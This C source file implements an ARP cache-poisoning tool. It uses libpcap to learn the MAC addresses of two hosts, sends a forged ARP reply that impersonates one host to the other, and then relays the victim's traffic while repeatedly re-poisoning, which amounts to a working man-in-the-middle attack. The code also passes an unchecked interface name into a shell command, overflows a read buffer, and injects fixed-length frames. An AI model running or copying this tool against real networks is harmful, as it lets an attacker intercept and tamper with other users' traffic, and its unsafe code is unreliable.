#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include "header.h"
#define ETHERTYPE_ARP 0x0806
//unsigned char packet[42];
pcap_t * handle;
/*void * func1(){
	while(1){
		pcap_sendpacket(handle,packet,sizeof(packet));
	}
}*/
void * func(void * p_thread){
	FILE * fp;
	char buff[17];
	char buff1[16];
	uint8_t buff2[4];
	uint8_t target_ip[4];
	uint8_t target_mac[6];
	char buff3[100] = "cat /sys/class/net/";
	char buff4[20] = "/address";
	char * dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	int i=0,j=0,a=0;
	struct ether_header * eth; 
	struct ether_header * rcv_eth;
	struct ether_header * rcv1_eth;
	struct arp * arp;
	struct arp * rcv_arp;
	struct pcap_pkthdr *header;
	struct p_thread * t_thread = (struct p_thread *)p_thread;
	unsigned char packet[42];
	unsigned char packet1[42];
	const u_char * rcv_packet;
	const u_char * rcv1_packet;
	const u_char * send_packet;
	int thr_id;
	int status;
	pthread_t thread[1];
	struct p_thread1 * p_thread1;

	eth = (struct ether_header *)packet;
	arp = (struct arp *)(packet+14);
	strcat(buff3,t_thread->argv1);
	strcat(buff3,buff4);
	fp = popen(buff3, "r");
    	if (fp == NULL)
    	{
        	perror("erro : ");
        	exit(0);
    	}

	fgets(buff, 18, fp);
	for(i=0;i<18;i++){
                if((i+1)%3==0 && i!=0){
			++j;
			continue;
		}
		if(i%3==0){
			eth->ether_shost[j]=16*(((int)buff[i]>96)?(int)buff[i]-87:(int)buff[i]-48);
			arp->ar_sha[j] = eth->ether_shost[j];
		}
		if((i+2)%3==0){
			eth->ether_shost[j]+=((int)buff[i]>96)?(int)buff[i]-87:(int)buff[i]-48;
			arp->ar_sha[j] = eth->ether_shost[j];
		}
	}
	fp = popen("ip addr | grep 'inet ' | grep brd | awk '{print $2}' | awk -F/ '{print $1}'", "r");
	if (fp == NULL)
        {
                perror("erro : ");
                exit(0);
        }
	fgets(buff1, 16, fp);
	inet_pton(AF_INET,(const char *)buff1,arp->ar_spa);
	inet_pton(AF_INET,(const char *)t_thread->argv2,arp->ar_tpa);
	for(i=0;i<6;i++){
		eth->ether_dhost[i]=0xff;
		arp->ar_tha[i]=0x00;
	}
	eth->ether_type = htons(ETHERTYPE_ARP);
	arp->hdtype = htons(0x01);
	arp->pttype = htons(0x0800);
	arp->hdadd_len = 6;
	arp->ptadd_len = 4;
	arp->op = htons(0x01);
	handle = pcap_open_live(t_thread->argv1, BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL) {
        	fprintf(stderr, "Couldn't open device %s: %s\n",t_thread->argv1, errbuf);
        	exit(0);
        }
	pcap_sendpacket(handle,packet,sizeof(packet));
	inet_pton(AF_INET,(const char *)t_thread->argv3,arp->ar_tpa);
	pcap_sendpacket(handle,packet,sizeof(packet));	
	while(1){
		i = pcap_next_ex(handle, &header,&rcv_packet);
		if(i==1){
			rcv_eth = (struct ether_header *)rcv_packet;
			if(ETHERTYPE_ARP!=ntohs(rcv_eth->ether_type))continue;
			rcv_arp = (struct arp *)(rcv_packet+14);
			if(2!=ntohs(rcv_arp->op))continue;
			inet_pton(AF_INET,t_thread->argv2,buff2);
			inet_pton(AF_INET,t_thread->argv3,target_ip);
			if(!strncmp((char *)buff2,(char *)(rcv_arp->ar_spa),4)){
				strncpy((char *)arp->ar_tha,(char *)rcv_arp->ar_sha,6);
				for(j=0;j<6;j++){
				arp->ar_tha[j] = eth->ether_dhost[j] = rcv_arp->ar_sha[j];
			}
				a++;
			}
			if(!strncmp((char *)target_ip,(char *)(rcv_arp->ar_spa),4)){
				memcpy((char *)target_mac,(char *)rcv_arp->ar_sha,6);
				a++;
			}
			if(a==2)break;
		}
	}

	inet_pton(AF_INET,(const char *)t_thread->argv3,arp->ar_spa);
	arp->op = htons(0x02);
	pcap_sendpacket(handle,packet,sizeof(packet));
	//thr_id = pthread_create(&thread[0],NULL,func1,(void *)p_thread);

	while(1){
		i = pcap_next_ex(handle,&header,&rcv1_packet);
		if(i==1){
			rcv1_eth = (struct ether_header *)rcv1_packet;
			pcap_sendpacket(handle,packet,sizeof(packet));
			if(memcmp(arp->ar_tha,rcv1_eth->ether_shost,6)==0){
				memcpy(rcv1_eth->ether_dhost,target_mac,6);
				i = pcap_inject(handle,rcv1_packet,1500);
				if(i==-1){
					printf("%s\n",pcap_geterr(handle));
					continue;
				}
			}			
		}
	}
	//pthread_join(thread[0], (void **)&status);
}
